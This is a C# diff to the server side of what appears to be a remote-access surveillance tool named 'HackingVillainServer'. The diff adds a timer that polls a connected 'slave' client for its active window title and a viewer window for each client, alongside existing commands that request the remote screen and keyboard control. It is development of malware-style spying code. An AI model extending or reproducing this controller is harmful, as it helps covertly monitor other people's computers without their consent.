@@ -121,6 +121,11 @@ namespace HackingVillainServer
                     _readyForSize = true;
                 }
             }
+            else if (_readyForWindow)
+            {
+                _readyForWindow = false;
+                _clients[0].CurrentWindow = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
+            }
             else
             {
                 var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
@@ -142,7 +147,7 @@ namespace HackingVillainServer
         {
             Buffer b = Buffer.New();
             Buffer.Add(b, Encoding.UTF8.GetBytes(msg));
-            _clients[listView1.SelectedItems[0].Index].Socket.SendMessage(b);
+            _clients[0].Socket.SendMessage(b);
         }
 
         private void 키보드KToolStripMenuItem_Click(object sender, EventArgs e)
@@ -200,6 +205,20 @@ namespace HackingVillainServer
             _readyForSize = true;
             _readyForScreen = true;
             Send("Show Me The Screen");
+        }
+
+        bool _readyForWindow;
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            _readyForWindow = true;
+            Send("Current Window");
+        }
+
+        private void listView1_MouseDoubleClick(object sender, MouseEventArgs e)
+        {
+            if (listView1.SelectedItems.Count != 1) return;
+            SlaveViewer viewer = new SlaveViewer(_clients[listView1.SelectedItems[0].Index]);
+            viewer.Show();
         }
     }
 }
